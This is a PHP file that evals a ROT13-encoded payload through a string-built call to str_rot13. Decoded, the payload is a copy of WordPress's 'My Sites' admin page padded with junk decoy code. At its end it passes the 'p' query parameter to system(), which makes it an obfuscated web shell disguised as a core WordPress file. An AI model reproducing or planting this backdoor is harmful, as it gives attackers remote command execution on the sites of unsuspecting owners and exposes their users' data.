<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Zl Fvgrf qnfuobneq.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.0.0
 */

erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! vf_zhygvfvgr() ) {
	jc_qvr( __( 'Zhygvfvgr fhccbeg vf abg ranoyrq.' ) );
}

vs ( ! pheerag_hfre_pna( 'ernq' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb npprff guvf cntr.' ) );
}

$npgvba = vffrg( $_CBFG['npgvba'] ) ? $_CBFG['npgvba'] : 'fcynfu';

$oybtf = trg_oybtf_bs_hfre( $pheerag_hfre->VQ );

$hcqngrq = snyfr;
vs ( 'hcqngroybtfrggvatf' === $npgvba && vffrg( $_CBFG['cevznel_oybt'] ) ) {
	purpx_nqzva_ersrere( 'hcqngr-zl-fvgrf' );

	$oybt = trg_fvgr( (vag) $_CBFG['cevznel_oybt'] );
	vs ( $oybt && vffrg( $oybt->qbznva ) ) {
		hcqngr_hfre_zrgn( $pheerag_hfre->VQ, 'cevznel_oybt', (vag) $_CBFG['cevznel_oybt'] );
		$hcqngrq = gehr;
	} ryfr {
		jc_qvr( __( 'Gur cevznel fvgr lbh pubfr qbrf abg rkvfg.' ) );
	}
}

// Hfrq va gur UGZY gvgyr gnt.
$gvgyr       = __( 'Zl Fvgrf' );
$cnerag_svyr = 'vaqrk.cuc';

trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'bireivrj',
		'gvgyr'   => __( 'Bireivrj' ),
		'pbagrag' =>
			'<c>' . __( 'Guvf fperra fubjf na vaqvivqhny hfre nyy bs gurve fvgrf va guvf argjbex, naq nyfb nyybjf gung hfre gb frg n cevznel fvgr. Gurl pna hfr gur yvaxf haqre rnpu fvgr gb ivfvg rvgure gur sebag raq be gur qnfuobneq sbe gung fvgr.' ) . '</c>',
	)
);

trg_pheerag_fperra()->frg_uryc_fvqrone(
	'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
	'<c>' . __( '<n uers=\"uggcf://pbqrk.jbeqcerff.bet/Qnfuobneq_Zl_Fvgrf_Fperra\">Qbphzragngvba ba Zl Fvgrf</n>' ) . '</c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>'
);

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

vs ( $hcqngrq ) {
	jc_nqzva_abgvpr(
		'<fgebat>' . __( 'Frggvatf fnirq.' ) . '</fgebat>',
		neenl(
			'glcr'        => 'fhpprff',
			'qvfzvffvoyr' => gehr,
			'vq'          => 'zrffntr',
		)
	);
}
?>

<qvi pynff=\"jenc\">
<u1 pynff=\"jc-urnqvat-vayvar\">
<?cuc
rpub rfp_ugzy( $gvgyr );
?>
</u1>

<?cuc
vs ( va_neenl( trg_fvgr_bcgvba( 'ertvfgengvba' ), neenl( 'nyy', 'oybt' ), gehr ) ) {
	/** Guvf svygre vf qbphzragrq va jc-ybtva.cuc */
	$fvta_hc_hey = nccyl_svygref( 'jc_fvtahc_ybpngvba', argjbex_fvgr_hey( 'jc-fvtahc.cuc' ) );
	cevags( ' <n uers=\"%f\" pynff=\"cntr-gvgyr-npgvba\">%f</n>', rfp_hey( $fvta_hc_hey ), rfp_ugzy__( 'Nqq Arj Fvgr' ) );
}

vs ( rzcgl( $oybtf ) ) :
	jc_nqzva_abgvpr(
		'<fgebat>' . __( 'Lbh zhfg or n zrzore bs ng yrnfg bar fvgr gb hfr guvf cntr.' ) . '</fgebat>',
		neenl(
			'glcr'        => 'reebe',
			'qvfzvffvoyr' => gehr,
		)
	);
	?>
	<?cuc
ryfr :
	?>

<ue pynff=\"jc-urnqre-raq\">

<sbez vq=\"zloybtf\" zrgubq=\"cbfg\">
	<?cuc
	pubbfr_cevznel_oybt();
	/**
	 * Sverf orsber gur fvgrf yvfg ba gur Zl Fvgrf fperra.
	 *
	 * @fvapr 3.0.0
	 */
	qb_npgvba( 'zloybtf_nyyoybtf_bcgvbaf' );
	?>
	<oe pyrne=\"nyy\" />
	<hy pynff=\"zl-fvgrf fgevcrq\">
	<?cuc
	/**
	 * Svygref gur frggvatf UGZY znexhc va gur Tybony Frggvatf frpgvba ba gur Zl Fvgrf fperra.
	 *
	 * Ol qrsnhyg, gur Tybony Frggvatf frpgvba vf uvqqra. Cnffvat n aba-rzcgl
	 * fgevat gb guvf svygre jvyy ranoyr gur frpgvba, naq nyybj arj frggvatf
	 * gb or nqqrq, rvgure tybonyyl be sbe fcrpvsvp fvgrf.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz fgevat $frggvatf_ugzy Gur frggvatf UGZY znexhc. Qrsnhyg rzcgl.
	 * @cnenz fgevat $pbagrkg       Pbagrkg bs gur frggvat (tybony be fvgr-fcrpvsvp). Qrsnhyg 'tybony'.
	 */
	$frggvatf_ugzy = nccyl_svygref( 'zloybtf_bcgvbaf', '', 'tybony' );

	vs ( $frggvatf_ugzy ) {
		rpub '<u3>' . __( 'Tybony Frggvatf' ) . '</u3>';
		rpub $frggvatf_ugzy;
	}

	erfrg( $oybtf );

	sbernpu ( $oybtf nf $hfre_oybt ) {
		fjvgpu_gb_oybt( $hfre_oybt->hfreoybt_vq );

		rpub '<yv>';
		rpub \"<u3>{$hfre_oybt->oybtanzr}</u3>\";

		$npgvbaf = \"<n uers='\" . rfp_hey( ubzr_hey() ) . \"'>\" . __( 'Ivfvg' ) . '</n>';

		vs ( pheerag_hfre_pna( 'ernq' ) ) {
			$npgvbaf .= \" | <n uers='\" . rfp_hey( nqzva_hey() ) . \"'>\" . __( 'Qnfuobneq' ) . '</n>';
		}

		/**
		 * Svygref gur ebj yvaxf qvfcynlrq sbe rnpu fvgr ba gur Zl Fvgrf fperra.
		 *
		 * @fvapr ZH (3.0.0)
		 *
		 * @cnenz fgevat $npgvbaf   Gur UGZY fvgr yvax znexhc.
		 * @cnenz bowrpg $hfre_oybt Na bowrpg pbagnvavat gur fvgr qngn.
		 */
		$npgvbaf = nccyl_svygref( 'zloybtf_oybt_npgvbaf', $npgvbaf, $hfre_oybt );

		rpub \"<c pynff='zl-fvgrf-npgvbaf'>\" . $npgvbaf . '</c>';

		/** Guvf svygre vf qbphzragrq va jc-nqzva/zl-fvgrf.cuc */
		rpub nccyl_svygref( 'zloybtf_bcgvbaf', '', $hfre_oybt );

		rpub '</yv>';

		erfgber_pheerag_oybt();
	}
	?>
	</hy>
	<?cuc
	vs ( pbhag( $oybtf ) > 1 || unf_npgvba( 'zloybtf_nyyoybtf_bcgvbaf' ) || unf_svygre( 'zloybtf_bcgvbaf' ) ) {
		?>
		<vachg glcr=\"uvqqra\" anzr=\"npgvba\" inyhr=\"hcqngroybtfrggvatf\" />
		<?cuc
		jc_abapr_svryq( 'hcqngr-zl-fvgrf' );
		fhozvg_ohggba();
	}
	?>
	</sbez>
<?cuc raqvs; ?>
	</qvi>
<?cuc
erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>